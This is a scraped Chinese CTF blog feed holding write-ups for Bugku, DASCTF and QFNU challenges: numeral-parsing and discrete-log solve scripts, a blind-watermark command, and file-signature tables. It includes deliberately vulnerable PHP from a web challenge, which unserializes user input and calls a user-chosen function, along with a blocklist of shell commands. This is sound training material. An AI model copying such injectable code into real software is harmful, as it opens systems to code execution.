aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="./BugKU%E9%9D%B6%E5%9C%BA%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95Crypto%E7%AF%87/7.png" alt=""></p><p>借助~~<strong>WPS</strong>~~的替换功能将空格去掉，得到</p><blockquote><p>57656c636f6d6520746f206b656c61696265692e204769766520796f75206120666c6167206173206120676966742e2020666c61677b31653462663831613633393464653561626330303561633665333961333837627d202e2048617665206120676f6f642074696d657e</p></blockquote><p>最后使用在线的16进制转字符串工具得到flag。</p><blockquote><p>Welcome to kelaibei. Give you a flag as a gift.  flag{1e4bf81a6394de5abc005ac6e39a387b} . Have a good time~</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Bugku </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浙江工业大学秋季挑战赛wp</title>
      <link href="/2021/10/03/DASCTF%20X%20%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B/"/>
      <url>/2021/10/03/DASCTF%20X%20%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="浙江工业大学秋季挑战赛wp"><a href="#浙江工业大学秋季挑战赛wp" class="headerlink" title="浙江工业大学秋季挑战赛wp"></a>浙江工业大学秋季挑战赛wp</h1><p>[TOC]</p><p>这个比赛当天一共有三个比赛要打，这个我们就随便参与一下，做了<code>科技节</code>的比赛，还有NISP。下午正好还是我们学校的汇演，就一共拿出来了一个小时做这东西。最后就出了一道杂项，现在倒是有时间看看，顺手整合下网络上有点wp</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Girlfriend’s-account"><a href="#Girlfriend’s-account" class="headerlink" title="Girlfriend’s account"></a>Girlfriend’s account</h3><p>jackie的女朋友又偷偷用他的信用卡买东西了，你能算算一共花了多少钱吗？ 我自己的做法是用WPS的大写数字转数字的功能，用哪个做出来了这道题目。在比赛后复盘看了一些大佬的WP，其中白嫖来一个脚本。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token keyword">import</span> xlrddata<span class="token operator">=</span>xlrd<span class="token punctuation">.</span>open_workbook<span class="token punctuation">(</span><span class="token string">"D:\webtest\information.xls"</span><span class="token punctuation">)</span>table <span class="token operator">=</span> data<span class="token punctuation">.</span>sheets<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>nrows <span class="token operator">=</span> table<span class="token punctuation">.</span>nrowsprice<span class="token operator">=</span>table<span class="token punctuation">.</span>col_values<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> start_rowx<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> end_rowx<span class="token operator">=</span><span class="token number">5001</span><span class="token punctuation">)</span>number<span class="token operator">=</span>table<span class="token punctuation">.</span>col_values<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> start_rowx<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> end_rowx<span class="token operator">=</span><span class="token number">5001</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">num_change</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> num<span class="token operator">==</span><span class="token string">'零'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> num<span class="token operator">==</span><span class="token string">'壹'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> num<span class="token operator">==</span><span class="token string">'贰'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">2</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> num<span class="token operator">==</span><span class="token string">'叁'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> num<span class="token operator">==</span><span class="token string">'肆'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">4</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> num<span class="token operator">==</span><span class="token string">'陆'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">6</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> num<span class="token operator">==</span><span class="token string">'伍'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">5</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> num<span class="token operator">==</span><span class="token string">'柒'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">7</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> num<span class="token operator">==</span><span class="token string">'捌'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">8</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> num<span class="token operator">==</span><span class="token string">'玖'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">9</span><span class="token punctuation">;</span><span class="token keyword">def</span> <span class="token function">aoligeiganle</span><span class="token punctuation">(</span>amount<span class="token punctuation">)</span><span class="token punctuation">:</span>    chinese_num <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'零'</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'壹'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'贰'</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'叁'</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'肆'</span><span class="token punctuation">:</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'伍'</span><span class="token punctuation">:</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'陆'</span><span class="token punctuation">:</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token string">'柒'</span><span class="token punctuation">:</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token string">'捌'</span><span class="token punctuation">:</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'玖'</span><span class="token punctuation">:</span> <span class="token number">9</span><span class="token punctuation">&#125;</span>    chinese_amount <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'分'</span><span class="token punctuation">:</span> <span class="token number">0.01</span><span class="token punctuation">,</span> <span class="token string">'角'</span><span class="token punctuation">:</span> <span class="token number">0.1</span><span class="token punctuation">,</span> <span class="token string">'元'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'拾'</span><span class="token punctuation">:</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token string">'佰'</span><span class="token punctuation">:</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token string">'仟'</span><span class="token punctuation">:</span> <span class="token number">1000</span><span class="token punctuation">,</span> <span class="token string">'圆'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">&#125;</span>    amount_float <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">if</span> <span class="token string">'亿'</span> <span class="token keyword">in</span> amount<span class="token punctuation">:</span>        yi <span class="token operator">=</span> re<span class="token punctuation">.</span>match<span class="token punctuation">(</span><span class="token string">r'(.+)亿.*'</span><span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        amount_yi <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> chinese_amount<span class="token punctuation">:</span>            <span class="token keyword">if</span> i <span class="token keyword">in</span> yi<span class="token punctuation">:</span>                amount_yi <span class="token operator">+=</span> chinese_num<span class="token punctuation">[</span>yi<span class="token punctuation">[</span>yi<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">*</span> chinese_amount<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        <span class="token keyword">if</span> yi<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">in</span> chinese_num<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            amount_yi <span class="token operator">+=</span> chinese_num<span class="token punctuation">[</span>yi<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>        amount_float <span class="token operator">+=</span> amount_yi <span class="token operator">*</span> <span class="token number">100000000</span>        amount <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r'.+亿'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> amount<span class="token punctuation">,</span> count<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'万'</span> <span class="token keyword">in</span> amount<span class="token punctuation">:</span>        wan <span class="token operator">=</span> re<span class="token punctuation">.</span>match<span class="token punctuation">(</span><span class="token string">r'(.+)万.*'</span><span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        amount_wan <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> chinese_amount<span class="token punctuation">:</span>            <span class="token keyword">if</span> i <span class="token keyword">in</span> wan<span class="token punctuation">:</span>                amount_wan <span class="token operator">+=</span> chinese_num<span class="token punctuation">[</span>wan<span class="token punctuation">[</span>wan<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">*</span> chinese_amount<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        <span class="token keyword">if</span> wan<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">in</span> chinese_num<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            amount_wan <span class="token operator">+=</span> chinese_num<span class="token punctuation">[</span>wan<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>        amount_float <span class="token operator">+=</span> amount_wan <span class="token operator">*</span> <span class="token number">10000</span>        amount <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r'.+万'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> amount<span class="token punctuation">,</span> count<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>    amount_yuan <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> chinese_amount<span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token keyword">in</span> amount<span class="token punctuation">:</span>            <span class="token keyword">if</span> amount<span class="token punctuation">[</span>amount<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">in</span> chinese_num<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                amount_yuan <span class="token operator">+=</span> chinese_num<span class="token punctuation">[</span>amount<span class="token punctuation">[</span>amount<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">*</span> chinese_amount<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    amount_float <span class="token operator">+=</span> amount_yuan    <span class="token keyword">return</span> amount_float<span class="token builtin">sum</span><span class="token operator">=</span><span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token builtin">sum</span><span class="token operator">+=</span>aoligeiganle<span class="token punctuation">(</span>price<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">*</span>num_change<span class="token punctuation">(</span>number<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">sum</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下面能是我在另一位大佬哪里找到的exalt的公式…..</p><pre class="line-numbers language-none"><code class="language-none">&#x3D;SUM(ISNUMBER(SEARCH(TEXT(&#123;1,2,3,4,5,6,7,8,9&#125;,&quot;[dbnum2]&quot;&amp;&#123;&quot;0亿&quot;;&quot;0仟!*万&quot;;&quot;0佰!*万&quot;;&quot;0拾!*万&quot;;&quot;0万&quot;;&quot;万!*0仟&quot;;&quot;万!*0佰&quot;;&quot;万!*0拾&quot;;&quot;0元&quot;;&quot;0角&quot;;&quot;0分&quot;&#125;),IF(ISERR(FIND(&quot;万&quot;,A2)),&quot;万&quot;,)&amp;A2))*&#123;1,2,3,4,5,6,7,8,9&#125;*10^&#123;8;7;6;5;4;3;2;1;0;-1;-2&#125;)&#x3D;IF(B3&#x3D;”壹”,1,IF(B3&#x3D;”贰”,2,IF(B3&#x3D;”叁”,3,IF(B3&#x3D;”肆”,4,IF(B3&#x3D;”伍”,5,IF(B3&#x3D;”陆”,6,IF(B3&#x3D;”柒”,7,IF(B3&#x3D;”捌”,8,IF(B3&#x3D;”玖”,9)))))))))  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="双目失明-身残志坚"><a href="#双目失明-身残志坚" class="headerlink" title="双目失明,身残志坚"></a>双目失明,身残志坚</h3><p>看到这个题目还以为是什么神奇的东西，原来是桥本大辉那一脚</p><p>两张图片，同时明显是多了东西，这样应该是图片盲水印，这也符合失明这一点。</p><blockquote><p>Tip  ：<a href="https://github.com/chishaxie/BlindWaterMark">盲水印脚本：</a>与<a href="http://www.manongjc.com/detail/19-creiiewvkgwfziy.html">相关文档</a>，盲水印的题目考察次数倒是蛮多的，还得找题目练一下。</p></blockquote><p>python3命令</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">D:\个人CTFTools\隐写\图像隐写\BlindWaterMark-master&gt;python bwmforpy3.py decode original.png blind.png flag.png -oldseedimage&lt;original.png&gt; + image(encoded)&lt;blind.png&gt; -&gt; watermark&lt;flag.png&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后那张图片是又是盲文，果然是双目失明，身残志坚，这出题人有水平啊。对照<a href="https://blog.csdn.net/weixin_30785593/article/details/96365878">盲文对照表</a>可以发现这个flag实际上就是浙江工业大学的拼音…..</p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><p>菜狗不会，看大佬的吧</p><p>三道re:</p><ul><li><a href="https://www.cnblogs.com/holittech/articles/15335668.html">https://www.cnblogs.com/holittech/articles/15335668.html</a></li><li><a href="https://www.cnblogs.com/holittech/articles/15335673.html">https://www.cnblogs.com/holittech/articles/15335673.html</a></li><li><a href="https://www.cnblogs.com/holittech/articles/15335676.html">https://www.cnblogs.com/holittech/articles/15335676.html</a></li></ul><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><p>菜狗不会，看大佬的吧</p><ul><li><a href="https://www.cnblogs.com/LynneHuan/p/15335597.html">https://www.cnblogs.com/LynneHuan/p/15335597.html</a></li></ul><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="签到———-网鼎杯-2020-青龙组-（原题）"><a href="#签到———-网鼎杯-2020-青龙组-（原题）" class="headerlink" title="签到———[网鼎杯 2020 青龙组]（原题）"></a>签到———[网鼎杯 2020 青龙组]（原题）</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> randomflag<span class="token operator">=</span><span class="token string">b'flag&#123;******************&#125;'</span>n <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">**</span> <span class="token number">256</span>flaglong<span class="token operator">=</span>bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>m <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">1</span>c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> flaglong<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'m = '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'c = '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># m = 73964803637492582853353338913523546944627084372081477892312545091623069227301</span><span class="token comment"># c = 21572244511100216966799370397791432119463715616349800194229377843045443048821</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其实乍一看你会发现他和RSA加密很像，最后的加密过程为c = pow(m, bytes_to_long(flag), n)</p><p>RSA加密就是明文为m，取公钥e和n，密文c=pow(m,e,n)</p><p>这边的一个明显区别为，可以理解为flag明文作为RSA加密里面的公钥e进行的求解。</p><p>这个在密码学里面是基于离散对数的一种加密，我们在求解明文的时候，也就相当于是求解基于同余运算和原根的一种对数运算。</p><p>求解这种问题的话我们用python的sympy模块的discrete_log函数进行求解就可以了。discrete_log(n,c,m)</p><p><strong>解题脚本</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sympy<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>n <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">**</span> <span class="token number">256</span>m <span class="token operator">=</span> <span class="token number">73964803637492582853353338913523546944627084372081477892312545091623069227301</span>c <span class="token operator">=</span> <span class="token number">21572244511100216966799370397791432119463715616349800194229377843045443048821</span>flag<span class="token operator">=</span>sympy<span class="token punctuation">.</span>discrete_log<span class="token punctuation">(</span>n<span class="token punctuation">,</span>c<span class="token punctuation">,</span>m<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="hellounser"><a href="#hellounser" class="headerlink" title="hellounser"></a>hellounser</h3><p>题目先放在这里，解题我还没弄出来先放一个<a href="https://www.cnblogs.com/aninock/p/15336101.html">题解</a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$var</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">var</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">B</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$func</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$arg</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">func</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[a-z0-9]*$/isD'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">func</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">arg</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>             <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'No!No!No!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>             <span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>            <span class="token comment">//There is no code to print flag in flag.php</span>            <span class="token variable">$func</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">arg</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token operator">.</span><span class="token string double-quoted-string">"Nice Job!!"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$aaa</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 解题记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QFNU_CTF迎新赛题解</title>
      <link href="/2021/09/20/QFNU%20CTF%20%E8%BF%8E%E6%96%B0%E8%B5%9B%E8%A7%A3%E9%A2%98/"/>
      <url>/2021/09/20/QFNU%20CTF%20%E8%BF%8E%E6%96%B0%E8%B5%9B%E8%A7%A3%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h2 id="QFNU-CTF迎新赛题解"><a href="#QFNU-CTF迎新赛题解" class="headerlink" title="QFNU_CTF迎新赛题解"></a>QFNU_CTF迎新赛题解</h2><hr><p>这一套题目实际上是为新生准备的，我和对内另一位师哥在迎新的几天才知道这个题目的存在，也是正好我们没什么事情，就做了一下，这里将赛题的wp整理一下，同时考虑到纳新还在解题，不能给出完全的答案。</p><p>[TOC]</p><h2 id="（一）Misc"><a href="#（一）Misc" class="headerlink" title="（一）Misc"></a>（一）Misc</h2><h3 id="1-签到"><a href="#1-签到" class="headerlink" title="1.  签到"></a>1.  签到</h3><p>​        这道题提供了半张二维码，考虑是否有图像隐写，如修改图像高度。推荐使用工具winhex，png头下面一行的前四位16进制数为宽，后四位为高。</p><p>这里附带常见的文件头</p><pre class="line-numbers language-none"><code class="language-none">File                                ExtensionsHeader4 JPEG                                0xFFD8FFPNG                                 0x89504E470D0A1A0Agif                                 GIF8TIFF                                0x49492A00TIFF                                0x4D4D002A9Bit                                 BMAOL ART                             0x4A47040E0000003AOL ART                             0x4A47030E000000&amp;PC                                  0x0A0501080emf                                 0x0100000058000000#cdr                                 CDRdwg                                 0x41433130psd                                 8BPS3rtf                                 rtf6 XML                                 xml                              html;htm;php;php3;php4;phtml;shtml  type&amp; Email                               Delivery-date:dbx                                 0xCFAD12FEdoc;xls;dot;ppt;xla;ppa;pps;pot;msi;sdw;db    0xD0CF11E0A1B11AE1mdb;mda;mde;mdt                     Standardwpd                                 0xFF575043qdf                                 0xAC9EBD8Fqbb                                 0x4586000006004sly.or.srt.or.slt;sly;srt;slt       0x53520100lwp                          0x576F726450726Fzip;jar                             0x504B03041zip                                 0x504B3030rar                                 Rar!gz;tgz                              0x1F8B085 bz2                                 BZharj                                 0x60EA7z                                                                              7z集&#39;&amp; mpg;mpeg                            0x000001BA# mpg;mpeg                            0x000001B3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个在后期我们会发的个人CTF工具包里就有，不需要都记住，但是zip，rar，png等几个少数常用的，还是希望能够看见就清楚是哪个。</p><h3 id="2-捉猫猫"><a href="#2-捉猫猫" class="headerlink" title="2.  捉猫猫"></a>2.  捉猫猫</h3><p>这道题完全可以通过玩游戏得到，实际上应该是个简单的逆向，但是我是玩出来的(玩出来的内容并不完整，另一部分在哪呢？)所以有兴趣的可以去用逆向试一试</p><h3 id="3-relax"><a href="#3-relax" class="headerlink" title="3. relax"></a>3. relax</h3><p>这一道题是最经典的音频隐写题目，只需要使用<code>audacity-win-2-1-2.exe</code>工具，和一点脑洞。</p><h3 id="4-EasyPcap"><a href="#4-EasyPcap" class="headerlink" title="4. EasyPcap"></a>4. EasyPcap</h3><p>这道题算是最简单的流量分析题目，里面只有HTML和tcp两个流，依次追踪一遍就能知道答案。</p><h3 id="5-曲阜师范大学"><a href="#5-曲阜师范大学" class="headerlink" title="5. 曲阜师范大学"></a>5. 